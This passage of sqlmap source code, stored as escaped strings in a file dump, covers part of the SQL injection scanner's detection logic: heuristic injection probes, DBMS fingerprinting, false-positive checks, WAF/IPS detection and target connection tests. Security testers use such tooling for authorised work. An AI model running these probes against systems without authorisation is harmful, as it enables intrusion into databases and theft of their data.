injection.data[stype].falseCode = falseCode\n\n                        injection.conf.textOnly = conf.textOnly\n                        injection.conf.titles = conf.titles\n                        injection.conf.code = conf.code\n                        injection.conf.string = conf.string\n                        injection.conf.notString = conf.notString\n                        injection.conf.regexp = conf.regexp\n                        injection.conf.optimize = conf.optimize\n\n                        if conf.beep:\n                            beep()\n\n                        # There is no need to perform this test for other\n                        # <where> tags\n                        break\n\n                if injectable is True:\n                    kb.vulnHosts.add(conf.hostname)\n                    break\n\n            # Reset forced back-end DBMS value\n            Backend.flushForcedDbms()\n\n        except KeyboardInterrupt:\n            warnMsg = \"user aborted during detection phase\"\n            logger.warning(warnMsg)\n\n            if conf.multipleTargets:\n                msg = \"how do you want to proceed? [ne(X)t target/(s)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit]\"\n                choice = readInput(msg, default='X', checkBatch=False).upper()\n            else:\n                msg = \"how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit]\"\n                choice = readInput(msg, default='S', checkBatch=False).upper()\n\n            if choice == 'X':\n                if conf.multipleTargets:\n                    raise SqlmapSkipTargetException\n            elif choice == 'C':\n                choice = None\n                while not ((choice or \"\").isdigit() and 0 <= int(choice) <= 6):\n                    if choice:\n                        logger.warning(\"invalid value\")\n                    msg = \"enter new verbosity level: [0-6] \"\n                    choice = readInput(msg, default=str(conf.verbose), checkBatch=False)\n                conf.verbose = int(choice)\n                setVerbosity()\n                if hasattr(test.request, \"columns\") and hasattr(test.request, \"_columns\"):\n                    test.request.columns = test.request._columns\n                    delattr(test.request, \"_columns\")\n                tests.insert(0, test)\n            elif choice == 'N':\n                return None\n            elif choice == 'E':\n                kb.endDetection = True\n            elif choice == 'Q':\n                raise SqlmapUserQuitException\n\n        finally:\n            # Reset forced back-end DBMS value\n            Backend.flushForcedDbms()\n\n    Backend.flushForcedDbms(True)\n\n    # Return the injection object\n    if injection.place is not None and injection.parameter is not None:\n        if not conf.dropSetCookie and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data and injection.data[PAYLOAD.TECHNIQUE.BOOLEAN].vector.startswith('OR'):\n            warnMsg = \"in OR boolean-based injection cases, please consider usage \"\n            warnMsg += \"of switch '--drop-set-cookie' if you experience any \"\n            warnMsg += \"problems during data retrieval\"\n            logger.warning(warnMsg)\n\n        if not checkFalsePositives(injection):\n            if conf.hostname in kb.vulnHosts:\n                kb.vulnHosts.remove(conf.hostname)\n            if NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE not in injection.notes:\n                injection.notes.append(NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE)\n    else:\n        injection = None\n\n    if injection and NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE not in injection.notes:\n        checkSuhosinPatch(injection)\n        checkFilteredChars(injection)\n\n    return injection\n\n@stackedmethod\ndef heuristicCheckDbms(injection):\n    \"\"\"\n    This functions is called when boolean-based blind is identified with a\n    generic payload and the DBMS has not yet been fingerprinted to attempt\n    to identify with a simple DBMS specific boolean-based test what the DBMS\n    may be\n    \"\"\"\n\n    retVal = False\n\n    if conf.skipHeuristics:\n        return retVal\n\n    pushValue(kb.injection)\n    kb.injection = injection\n\n    for dbms in getPublicTypeMembers(DBMS, True):\n        randStr1, randStr2 = randomStr(), randomStr()\n\n        Backend.forceDbms(dbms)\n\n        if dbms in HEURISTIC_NULL_EVAL:\n            result = checkBooleanExpression(\"(SELECT %s%s) IS NULL\" % (HEURISTIC_NULL_EVAL[dbms], FROM_DUMMY_TABLE.get(dbms, \"\")))\n        elif not ((randStr1 in unescaper.escape(\"'%s'\" % randStr1)) and list(FROM_DUMMY_TABLE.values()).count(FROM_DUMMY_TABLE.get(dbms, \"\")) != 1):\n            result = checkBooleanExpression(\"(SELECT '%s'%s)=%s%s%s\" % (randStr1, FROM_DUMMY_TABLE.get(dbms, \"\"), SINGLE_QUOTE_MARKER, randStr1, SINGLE_QUOTE_MARKER))\n        else:\n            result = False\n\n        if result:\n            if not checkBooleanExpression(\"(SELECT '%s'%s)=%s%s%s\" % (randStr1, FROM_DUMMY_TABLE.get(dbms, \"\"), SINGLE_QUOTE_MARKER, randStr2, SINGLE_QUOTE_MARKER)):\n                retVal = dbms\n                break\n\n    Backend.flushForcedDbms()\n    kb.injection = popValue()\n\n    if retVal:\n        infoMsg = \"heuristic (extended) test shows that the back-end DBMS \"  # Not as important as \"parsing\" counter-part (because of false-positives)\n        infoMsg += \"could be '%s' \" % retVal\n        logger.info(infoMsg)\n\n        kb.heuristicExtendedDbms = retVal\n\n    return retVal\n\n@stackedmethod\ndef checkFalsePositives(injection):\n    \"\"\"\n    Checks for false positives (only in single special cases)\n    \"\"\"\n\n    retVal = True\n\n    if all(_ in (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED) for _ in injection.data) or (len(injection.data) == 1 and PAYLOAD.TECHNIQUE.UNION in injection.data and \"Generic\" in injection.data[PAYLOAD.TECHNIQUE.UNION].title):\n        pushValue(kb.injection)\n\n        infoMsg = \"checking if the injection point on %s \" % injection.place\n        infoMsg += \"parameter '%s' is a false positive\" % injection.parameter\n        logger.info(infoMsg)\n\n        def _():\n            return int(randomInt(2)) + 1\n\n        kb.injection = injection\n\n        for level in xrange(conf.level):\n            while True:\n                randInt1, randInt2, randInt3 = (_() for j in xrange(3))\n\n                randInt1 = min(randInt1, randInt2, randInt3)\n                randInt3 = max(randInt1, randInt2, randInt3)\n\n                if conf.string and any(conf.string in getUnicode(_) for _ in (randInt1, randInt2, randInt3)):\n                    continue\n\n                if conf.notString and any(conf.notString in getUnicode(_) for _ in (randInt1, randInt2, randInt3)):\n                    continue\n\n                if randInt3 > randInt2 > randInt1:\n                    break\n\n            if not checkBooleanExpression(\"%d%s%d\" % (randInt1, INFERENCE_EQUALS_CHAR, randInt1)):\n                retVal = False\n                break\n\n            if PAYLOAD.TECHNIQUE.BOOLEAN not in injection.data:\n                checkBooleanExpression(\"%d%s%d\" % (randInt1, INFERENCE_EQUALS_CHAR, randInt2))          # just in case if DBMS hasn't properly recovered from previous delayed request\n\n            if checkBooleanExpression(\"%d%s%d\" % (randInt1, INFERENCE_EQUALS_CHAR, randInt3)):          # this must not be evaluated to True\n                retVal = False\n                break\n\n            elif checkBooleanExpression(\"%d%s%d\" % (randInt3, INFERENCE_EQUALS_CHAR, randInt2)):        # this must not be evaluated to True\n                retVal = False\n                break\n\n            elif not checkBooleanExpression(\"%d%s%d\" % (randInt2, INFERENCE_EQUALS_CHAR, randInt2)):    # this must be evaluated to True\n                retVal = False\n                break\n\n            elif checkBooleanExpression(\"%d %d\" % (randInt3, randInt2)):                                # this must not be evaluated to True (invalid statement)\n                retVal = False\n                break\n\n        if not retVal:\n            warnMsg = \"false positive or unexploitable injection point detected\"\n            logger.warning(warnMsg)\n\n        kb.injection = popValue()\n\n    return retVal\n\n@stackedmethod\ndef checkSuhosinPatch(injection):\n    \"\"\"\n    Checks for existence of Suhosin-patch (and alike) protection mechanism(s)\n    \"\"\"\n\n    if injection.place in (PLACE.GET, PLACE.URI):\n        debugMsg = \"checking for parameter length \"\n        debugMsg += \"constraining mechanisms\"\n        logger.debug(debugMsg)\n\n        pushValue(kb.injection)\n\n        kb.injection = injection\n        randInt = randomInt()\n\n        if not checkBooleanExpression(\"%d=%s%d\" % (randInt, ' ' * SUHOSIN_MAX_VALUE_LENGTH, randInt)):\n            warnMsg = \"parameter length constraining \"\n            warnMsg += \"mechanism detected (e.g. Suhosin patch). \"\n            warnMsg += \"Potential problems in enumeration phase can be expected\"\n            logger.warning(warnMsg)\n\n        kb.injection = popValue()\n\n@stackedmethod\ndef checkFilteredChars(injection):\n    debugMsg = \"checking for filtered characters\"\n    logger.debug(debugMsg)\n\n    pushValue(kb.injection)\n\n    kb.injection = injection\n    randInt = randomInt()\n\n    # all other techniques are already using parentheses in tests\n    if len(injection.data) == 1 and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:\n        if not checkBooleanExpression(\"(%d)=%d\" % (randInt, randInt)):\n            warnMsg = \"it appears that some non-alphanumeric characters (i.e. ()) are \"\n            warnMsg += \"filtered by the back-end server. There is a strong \"\n            warnMsg += \"possibility that sqlmap won't be able to properly \"\n            warnMsg += \"exploit this vulnerability\"\n            logger.warning(warnMsg)\n\n    # inference techniques depend on character '>'\n    if not any(_ in injection.data for _ in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.QUERY)):\n        if not checkBooleanExpression(\"%d>%d\" % (randInt + 1, randInt)):\n            warnMsg = \"it appears that the character '>' is \"\n            warnMsg += \"filtered by the back-end server. You are strongly \"\n            warnMsg += \"advised to rerun with the '--tamper=between'\"\n            logger.warning(warnMsg)\n\n    kb.injection = popValue()\n\ndef heuristicCheckSqlInjection(place, parameter):\n    if conf.skipHeuristics:\n        return None\n\n    origValue = conf.paramDict[place][parameter]\n    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place\n\n    prefix = \"\"\n    suffix = \"\"\n    randStr = \"\"\n\n    if conf.prefix or conf.suffix:\n        if conf.prefix:\n            prefix = conf.prefix\n\n        if conf.suffix:\n            suffix = conf.suffix\n\n    while randStr.count('\\'') != 1 or randStr.count('\\\"') != 1:\n        randStr = randomStr(length=10, alphabet=HEURISTIC_CHECK_ALPHABET)\n\n    kb.heuristicMode = True\n\n    payload = \"%s%s%s\" % (prefix, randStr, suffix)\n    payload = agent.payload(place, parameter, newValue=payload)\n    page, _, _ = Request.queryPage(payload, place, content=True, raise404=False)\n\n    kb.heuristicPage = page\n    kb.heuristicMode = False\n\n    parseFilePaths(page)\n    result = wasLastResponseDBMSError()\n\n    infoMsg = \"heuristic (basic) test shows that %sparameter '%s' might \" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n\n    def _(page):\n        return any(_ in (page or \"\") for _ in FORMAT_EXCEPTION_STRINGS)\n\n    casting = _(page) and not _(kb.originalPage)\n\n    if not casting and not result and kb.dynamicParameter and origValue.isdigit() and not kb.heavilyDynamic:\n        randInt = int(randomInt())\n        payload = \"%s%s%s\" % (prefix, \"%d-%d\" % (int(origValue) + randInt, randInt), suffix)\n        payload = agent.payload(place, parameter, newValue=payload, where=PAYLOAD.WHERE.REPLACE)\n        result = Request.queryPage(payload, place, raise404=False)\n\n        if not result:\n            randStr = randomStr()\n            payload = \"%s%s%s\" % (prefix, \"%s.%d%s\" % (origValue, random.randint(1, 9), randStr), suffix)\n            payload = agent.payload(place, parameter, newValue=payload, where=PAYLOAD.WHERE.REPLACE)\n            casting = Request.queryPage(payload, place, raise404=False)\n\n    kb.heuristicTest = HEURISTIC_TEST.CASTED if casting else HEURISTIC_TEST.NEGATIVE if not result else HEURISTIC_TEST.POSITIVE\n\n    if kb.heavilyDynamic:\n        debugMsg = \"heuristic check stopped because of heavy dynamicity\"\n        logger.debug(debugMsg)\n        return kb.heuristicTest\n\n    if casting:\n        errMsg = \"possible %s casting detected (e.g. '\" % (\"integer\" if origValue.isdigit() else \"type\")\n\n        platform = conf.url.split('.')[-1].lower()\n        if platform == WEB_PLATFORM.ASP:\n            errMsg += \"%s=CInt(request.querystring(\\\"%s\\\"))\" % (parameter, parameter)\n        elif platform == WEB_PLATFORM.ASPX:\n            errMsg += \"int.TryParse(Request.QueryString[\\\"%s\\\"], out %s)\" % (parameter, parameter)\n        elif platform == WEB_PLATFORM.JSP:\n            errMsg += \"%s=Integer.parseInt(request.getParameter(\\\"%s\\\"))\" % (parameter, parameter)\n        else:\n            errMsg += \"$%s=intval($_REQUEST[\\\"%s\\\"])\" % (parameter, parameter)\n\n        errMsg += \"') at the back-end web application\"\n        logger.error(errMsg)\n\n        if kb.ignoreCasted is None:\n            message = \"do you want to skip those kind of cases (and save scanning time)? %s \" % (\"[Y/n]\" if conf.multipleTargets else \"[y/N]\")\n            kb.ignoreCasted = readInput(message, default='Y' if conf.multipleTargets else 'N', boolean=True)\n\n    elif result:\n        infoMsg += \"be injectable\"\n        if Backend.getErrorParsedDBMSes():\n            infoMsg += \" (possible DBMS: '%s')\" % Format.getErrorParsedDBMSes()\n        logger.info(infoMsg)\n\n    else:\n        infoMsg += \"not be injectable\"\n        logger.warning(infoMsg)\n\n    kb.heuristicMode = True\n    kb.disableHtmlDecoding = True\n\n    randStr1, randStr2 = randomStr(NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH), randomStr(NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH)\n    value = \"%s%s%s\" % (randStr1, DUMMY_NON_SQLI_CHECK_APPENDIX, randStr2)\n    payload = \"%s%s%s\" % (prefix, \"'%s\" % value, suffix)\n    payload = agent.payload(place, parameter, newValue=payload)\n    page, _, _ = Request.queryPage(payload, place, content=True, raise404=False)\n\n    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place\n\n    # Reference: https://bugs.python.org/issue18183\n    if value.upper() in (page or \"\").upper():\n        infoMsg = \"heuristic (XSS) test shows that %sparameter '%s' might be vulnerable to cross-site scripting (XSS) attacks\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n        logger.info(infoMsg)\n\n        if conf.beep:\n            beep()\n\n    for match in re.finditer(FI_ERROR_REGEX, page or \"\"):\n        if randStr1.lower() in match.group(0).lower():\n            infoMsg = \"heuristic (FI) test shows that %sparameter '%s' might be vulnerable to file inclusion (FI) attacks\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n            logger.info(infoMsg)\n\n            if conf.beep:\n                beep()\n\n            break\n\n    kb.disableHtmlDecoding = False\n    kb.heuristicMode = False\n\n    return kb.heuristicTest\n\ndef checkDynParam(place, parameter, value):\n    \"\"\"\n    This function checks if the URL parameter is dynamic. If it is\n    dynamic, the content of the page differs, otherwise the\n    dynamicity might depend on another parameter.\n    \"\"\"\n\n    if kb.choices.redirect:\n        return None\n\n    kb.matchRatio = None\n    dynResult = None\n    randInt = randomInt()\n\n    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place\n\n    infoMsg = \"testing if %sparameter '%s' is dynamic\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n    logger.info(infoMsg)\n\n    try:\n        payload = agent.payload(place, parameter, value, getUnicode(randInt))\n        dynResult = Request.queryPage(payload, place, raise404=False)\n    except SqlmapConnectionException:\n        pass\n\n    result = None if dynResult is None else not dynResult\n    kb.dynamicParameter = result\n\n    return result\n\ndef checkDynamicContent(firstPage, secondPage):\n    \"\"\"\n    This function checks for the dynamic content in the provided pages\n    \"\"\"\n\n    if kb.nullConnection:\n        debugMsg = \"dynamic content checking skipped \"\n        debugMsg += \"because NULL connection used\"\n        logger.debug(debugMsg)\n        return\n\n    if any(page is None for page in (firstPage, secondPage)):\n        warnMsg = \"can't check dynamic content \"\n        warnMsg += \"because of lack of page content\"\n        logger.critical(warnMsg)\n        return\n\n    if firstPage and secondPage and any(len(_) > MAX_DIFFLIB_SEQUENCE_LENGTH for _ in (firstPage, secondPage)):\n        ratio = None\n    else:\n        try:\n            seqMatcher = getCurrentThreadData().seqMatcher\n            seqMatcher.set_seq1(firstPage)\n            seqMatcher.set_seq2(secondPage)\n            ratio = seqMatcher.quick_ratio()\n        except MemoryError:\n            ratio = None\n\n    if ratio is None:\n        kb.skipSeqMatcher = True\n\n    # In case of an intolerable difference turn on dynamicity removal engine\n    elif ratio <= UPPER_RATIO_BOUND:\n        findDynamicContent(firstPage, secondPage)\n\n        count = 0\n        while not Request.queryPage():\n            count += 1\n\n            if count > conf.retries:\n                warnMsg = \"target URL content appears to be too dynamic. \"\n                warnMsg += \"Switching to '--text-only' \"\n                logger.warning(warnMsg)\n\n                conf.textOnly = True\n                return\n\n            warnMsg = \"target URL content appears to be heavily dynamic. \"\n            warnMsg += \"sqlmap is going to retry the request(s)\"\n            singleTimeLogMessage(warnMsg, logging.CRITICAL)\n\n            kb.heavilyDynamic = True\n\n            secondPage, _, _ = Request.queryPage(content=True)\n            findDynamicContent(firstPage, secondPage)\n\ndef checkStability():\n    \"\"\"\n    This function checks if the URL content is stable requesting the\n    same page two times with a small delay within each request to\n    assume that it is stable.\n\n    In case the content of the page differs when requesting\n    the same page, the dynamicity might depend on other parameters,\n    like for instance string matching (--string).\n    \"\"\"\n\n    infoMsg = \"testing if the target URL content is stable\"\n    logger.info(infoMsg)\n\n    firstPage = kb.originalPage  # set inside checkConnection()\n\n    delay = MAX_STABILITY_DELAY - (time.time() - (kb.originalPageTime or 0))\n    delay = max(0, min(MAX_STABILITY_DELAY, delay))\n    time.sleep(delay)\n\n    secondPage, _, _ = Request.queryPage(content=True, noteResponseTime=False, raise404=False)\n\n    if kb.choices.redirect:\n        return None\n\n    kb.pageStable = (firstPage == secondPage)\n\n    if kb.pageStable:\n        if firstPage:\n            infoMsg = \"target URL content is stable\"\n            logger.info(infoMsg)\n        else:\n            errMsg = \"there was an error checking the stability of page \"\n            errMsg += \"because of lack of content. Please check the \"\n            errMsg += \"page request results (and probable errors) by \"\n            errMsg += \"using higher verbosity levels\"\n            logger.error(errMsg)\n\n    else:\n        warnMsg = \"target URL content is not stable (i.e. content differs). sqlmap will base the page \"\n        warnMsg += \"comparison on a sequence matcher. If no dynamic nor \"\n        warnMsg += \"injectable parameters are detected, or in case of \"\n        warnMsg += \"junk results, refer to user's manual paragraph \"\n        warnMsg += \"'Page comparison'\"\n        logger.warning(warnMsg)\n\n        message = \"how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] \"\n        choice = readInput(message, default='C').upper()\n\n        if choice == 'Q':\n            raise SqlmapUserQuitException\n\n        elif choice == 'S':\n            showStaticWords(firstPage, secondPage)\n\n            message = \"please enter value for parameter 'string': \"\n            string = readInput(message)\n\n            if string:\n                conf.string = string\n\n                if kb.nullConnection:\n                    debugMsg = \"turning off NULL connection \"\n                    debugMsg += \"support because of string checking\"\n                    logger.debug(debugMsg)\n\n                    kb.nullConnection = None\n            else:\n                errMsg = \"Empty value supplied\"\n                raise SqlmapNoneDataException(errMsg)\n\n        elif choice == 'R':\n            message = \"please enter value for parameter 'regex': \"\n            regex = readInput(message)\n\n            if regex:\n                conf.regex = regex\n\n                if kb.nullConnection:\n                    debugMsg = \"turning off NULL connection \"\n                    debugMsg += \"support because of regex checking\"\n                    logger.debug(debugMsg)\n\n                    kb.nullConnection = None\n            else:\n                errMsg = \"Empty value supplied\"\n                raise SqlmapNoneDataException(errMsg)\n\n        else:\n            checkDynamicContent(firstPage, secondPage)\n\n    return kb.pageStable\n\n@stackedmethod\ndef checkWaf():\n    \"\"\"\n    Reference: http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse\n    \"\"\"\n\n    if any((conf.string, conf.notString, conf.regexp, conf.dummy, conf.offline, conf.skipWaf)):\n        return None\n\n    if kb.originalCode == _http_client.NOT_FOUND:\n        return None\n\n    _ = hashDBRetrieve(HASHDB_KEYS.CHECK_WAF_RESULT, True)\n    if _ is not None:\n        if _:\n            warnMsg = \"previous heuristics detected that the target \"\n            warnMsg += \"is protected by some kind of WAF/IPS\"\n            logger.critical(warnMsg)\n        return _\n\n    if not kb.originalPage:\n        return None\n\n    infoMsg = \"checking if the target is protected by \"\n    infoMsg += \"some kind of WAF/IPS\"\n    logger.info(infoMsg)\n\n    retVal = False\n    payload = \"%d %s\" % (randomInt(), IPS_WAF_CHECK_PAYLOAD)\n\n    place = PLACE.GET\n    if PLACE.URI in conf.parameters:\n        value = \"%s=%s\" % (randomStr(), agent.addPayloadDelimiters(payload))\n    else:\n        value = \"\" if not conf.parameters.get(PLACE.GET) else conf.parameters[PLACE.GET] + DEFAULT_GET_POST_DELIMITER\n        value += \"%s=%s\" % (randomStr(), agent.addPayloadDelimiters(payload))\n\n    pushValue(kb.choices.redirect)\n    pushValue(kb.resendPostOnRedirect)\n    pushValue(conf.timeout)\n\n    kb.choices.redirect = REDIRECTION.YES\n    kb.resendPostOnRedirect = False\n    conf.timeout = IPS_WAF_CHECK_TIMEOUT\n\n    try:\n        retVal = (Request.queryPage(place=place, value=value, getRatioValue=True, noteResponseTime=False, silent=True, raise404=False, disableTampering=True)[1] or 0) < IPS_WAF_CHECK_RATIO\n    except SqlmapConnectionException:\n        retVal = True\n    finally:\n        kb.matchRatio = None\n\n        conf.timeout = popValue()\n        kb.resendPostOnRedirect = popValue()\n        kb.choices.redirect = popValue()\n\n    hashDBWrite(HASHDB_KEYS.CHECK_WAF_RESULT, retVal, True)\n\n    if retVal:\n        if not kb.identifiedWafs:\n            warnMsg = \"heuristics detected that the target \"\n            warnMsg += \"is protected by some kind of WAF/IPS\"\n            logger.critical(warnMsg)\n\n        message = \"are you sure that you want to \"\n        message += \"continue with further target testing? [Y/n] \"\n        choice = readInput(message, default='Y', boolean=True)\n\n        if not choice:\n            raise SqlmapUserQuitException\n        else:\n            if not conf.tamper:\n                warnMsg = \"please consider usage of tamper scripts (option '--tamper')\"\n                singleTimeWarnMessage(warnMsg)\n\n    return retVal\n\n@stackedmethod\ndef checkNullConnection():\n    \"\"\"\n    Reference: http://www.wisec.it/sectou.php?id=472f952d79293\n    \"\"\"\n\n    if conf.data:\n        return False\n\n    _ = hashDBRetrieve(HASHDB_KEYS.CHECK_NULL_CONNECTION_RESULT, True)\n    if _ is not None:\n        kb.nullConnection = _\n\n        if _:\n            dbgMsg = \"resuming NULL connection method '%s'\" % _\n            logger.debug(dbgMsg)\n\n    else:\n        infoMsg = \"testing NULL connection to the target URL\"\n        logger.info(infoMsg)\n\n        pushValue(kb.pageCompress)\n        kb.pageCompress = False\n\n        try:\n            page, headers, _ = Request.getPage(method=HTTPMETHOD.HEAD, raise404=False)\n\n            if not page and HTTP_HEADER.CONTENT_LENGTH in (headers or {}):\n                kb.nullConnection = NULLCONNECTION.HEAD\n\n                infoMsg = \"NULL connection is supported with HEAD method ('Content-Length')\"\n                logger.info(infoMsg)\n            else:\n                page, headers, _ = Request.getPage(auxHeaders={HTTP_HEADER.RANGE: \"bytes=-1\"})\n\n                if page and len(page) == 1 and HTTP_HEADER.CONTENT_RANGE in (headers or {}):\n                    kb.nullConnection = NULLCONNECTION.RANGE\n\n                    infoMsg = \"NULL connection is supported with GET method ('Range')\"\n                    logger.info(infoMsg)\n                else:\n                    _, headers, _ = Request.getPage(skipRead=True)\n\n                    if HTTP_HEADER.CONTENT_LENGTH in (headers or {}):\n                        kb.nullConnection = NULLCONNECTION.SKIP_READ\n\n                        infoMsg = \"NULL connection is supported with 'skip-read' method\"\n                        logger.info(infoMsg)\n\n        except SqlmapConnectionException:\n            pass\n\n        finally:\n            kb.pageCompress = popValue()\n            kb.nullConnection = False if kb.nullConnection is None else kb.nullConnection\n            hashDBWrite(HASHDB_KEYS.CHECK_NULL_CONNECTION_RESULT, kb.nullConnection, True)\n\n    return kb.nullConnection in getPublicTypeMembers(NULLCONNECTION, True)\n\ndef checkConnection(suppressOutput=False):\n    threadData = getCurrentThreadData()\n\n    if not re.search(r\"\\A\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\Z\", conf.hostname):\n        if not any((conf.proxy, conf.tor, conf.dummy, conf.offline)):\n            try:\n                debugMsg = \"resolving hostname '%s'\" % conf.hostname\n                logger.debug(debugMsg)\n                socket.getaddrinfo(conf.hostname, None)\n            except socket.gaierror:\n                errMsg = \"host '%s' does not exist\" % conf.hostname\n                raise SqlmapConnectionException(errMsg)\n            except socket.error as ex:\n                errMsg = \"problem occurred while \"\n                errMsg += \"resolving a host name '%s' ('%s')\" % (conf.hostname, getSafeExString(ex))\n                raise SqlmapConnectionException(errMsg)\n            except UnicodeError as ex:\n                errMsg = \"problem occurred while \"\n                errMsg += \"handling a host name '%s' ('%s')\" % (conf.hostname, getSafeExString(ex))\n                raise SqlmapDataException(errMsg)\n\n    if not suppressOutput and not conf.dummy and not conf.offline:\n        infoMsg = \"testing connection to the target URL\"\n        logger.info(infoMsg)\n\n    try:\n        kb.originalPageTime = time.time()\n        page, headers, _ = Request.queryPage(content=True, noteResponseTime=False)\n\n        rawResponse = \"%s%s\" % (listToStrValue(headers.headers if headers else \"\"), page)\n\n        if conf.string:\n            infoMsg = \"testing if the provided string is within the \"\n            infoMsg += \"target URL page content\"\n            logger.info(infoMsg)\n\n            if conf.string not in rawResponse:\n                warnMsg = \"you provided '%s' as the string to \" % conf.string\n                warnMsg += \"match, but such a string is not within the target \"\n                warnMsg += \"URL raw response, sqlmap will carry on anyway\"\n                logger.warning(warnMsg)\n\n        if conf.regexp:\n            infoMsg = \"testing if the provided regular expression matches within \"\n            infoMsg += \"the target URL page content\"\n            logger.info(infoMsg)\n\n            if not re.search(conf.regexp, rawResponse, re.I | re.M):\n                warnMsg = \"you provided '%s' as the regular expression \" % conf.regexp\n                warnMsg += \"which does not have any match within the target URL raw response. sqlmap \"\n                warnMsg += \"will carry on anyway\"\n                logger.warning(warnMsg)\n\n        kb.errorIsNone = False\n\n        if any(_ in (kb.serverHeader or \"\") for _ in PRECONNECT_INCOMPATIBLE_SERVERS):\n            singleTimeWarnMessage(\"turning off pre-connect mechanism because of incompatible server ('%s')\" % kb.serverHeader)\n            conf.disablePrecon = True\n\n        if not kb.originalPage and wasLastResponseHTTPError():\n            if getLastRequestHTTPError() not in (conf.ignoreCode or []):\n                errMsg = \"unable to retrieve page content\"\n                raise SqlmapConnectionException(errMsg)\n        elif wasLastResponseDBMSError():\n            warnMsg = \"there is a DBMS error found in the HTTP response body \"\n            warnMsg += \"which could interfere with the results of the tests\"\n            logger.warning(warnMsg)\n        elif wasLastResponseHTTPError():\n            if getLastRequestHTTPError() not in (conf.ignoreCode or []):\n                warnMsg = \"the web server responded with an HTTP error code (%d) \" % getLastRequestHTTPError()\n                warnMsg += \"which could interfere with the results of the tests\"\n                logger.warning(warnMsg)\n        else:\n            kb.errorIsNone = True\n\n        if kb.choices.redirect == REDIRECTION.YES and threadData.lastRedirectURL and threadData.lastRedirectURL[0] == threadData.lastRequestUID:\n            if (threadData.lastRedirectURL[1] or \"\").startswith(\"https://\") and conf.hostname in getUnicode(threadData.lastRedirectURL[1]):\n                conf.url = re.sub(r\"https?://\", \"https://\", conf.url)\n                match = re.search(r\":(\\d+)\", threadData.lastRedirectURL[1])\n                port = match.group(1) if match else 443\n                conf.url = re.sub(r\":\\d+(/|\\Z)\", r\":%s\\g<1>\" % port, conf.url)\n\n    except SqlmapConnectionException as ex:\n        if conf.ipv6:\n            warnMsg = \"check connection to a provided \"\n            warnMsg += \"IPv6 address with a tool like ping6 \"\n            warnMsg += \"(e.g. 'ping6 -I eth0 %s') \" % conf.hostname\n            warnMsg += \"prior to running sqlmap to avoid \"\n            warnMsg += \"any addressing issues\"\n            singleTimeWarnMessage(warnMsg)\n\n        if any(code in kb.httpErrorCodes for code in (_http_client.NOT_FOUND, )):\n            errMsg = getSafeExString(ex)\n            logger.critical(errMsg)\n\n            if conf.multipleTargets:\n                return False\n\n            msg = \"it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] \"\n            if readInput(msg, default='Y', boolean=True):\n                raise SqlmapSilentQuitException\n            else:\n                kb.ignoreNotFound = True\n        else:\n            raise\n    finally:\n        kb.originalPage = kb.pageTemplate = threadData.lastPage\n        kb.originalCode = threadData.lastCode\n\n    if conf.cj and not conf.cookie and not any(_[0] == HTTP_HEADER.COOKIE for _ in conf.httpHeaders) and not conf.dropSetCookie:\n        candidate = DEFAULT_COOKIE_DELIMITER.join(\"%s=%s\" % (_.name, _.value) for _ in conf.cj)\n\n        message = \"you have not declared cookie(s), while \"\n        message += \"server wants to set its own ('%s'). \" % re.sub(r\"(=[^=;]{10}[^=;])[^=;]+([^=;]{10})\", r\"\\g<1>...\\g<2>\", candidate)\n        message += \"Do you want to use those [Y/n] \"\n        if readInput(message, default='Y', boolean=True):\n            kb.mergeCookies = True\n            conf.httpHeaders.append((HTTP_HEADER.COOKIE, candidate))\n\n    return True\n\ndef checkInternet():\n    content = Request.getPage(url=CHECK_INTERNET_ADDRESS, checking=True)[0]\n    return CHECK_INTERNET_VALUE in (content or \"\")\n\ndef setVerbosity():  # Cross-referenced function\n    raise NotImplementedError\n", "lib/controller/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/controller/handler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.dicts import DBMS_DICT\nfrom lib.core.enums import DBMS\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.settings import ACCESS_ALIASES\nfrom lib.core.settings import ALTIBASE_ALIASES\nfrom lib.core.settings import CACHE_ALIASES\nfrom lib.core.settings import CLICKHOUSE_ALIASES\nfrom lib.core.settings import CRATEDB_ALIASES\nfrom lib.core.settings import CUBRID_ALIASES\nfrom lib.core.settings import DB2_ALIASES\nfrom lib.core.settings import DERBY_ALIASES\nfrom lib.core.settings import EXTREMEDB_ALIASES\nfrom lib.core.settings import FIREBIRD_ALIASES\nfrom lib.core.settings import FRONTBASE_ALIASES\nfrom lib.core.settings import H2_ALIASES\nfrom lib.core.settings import HSQLDB_ALIASES\nfrom lib.core.settings import INFORMIX_ALIASES\nfrom lib.core.settings import MAXDB_ALIASES\nfrom lib.core.settings import MCKOI_ALIASES\nfrom 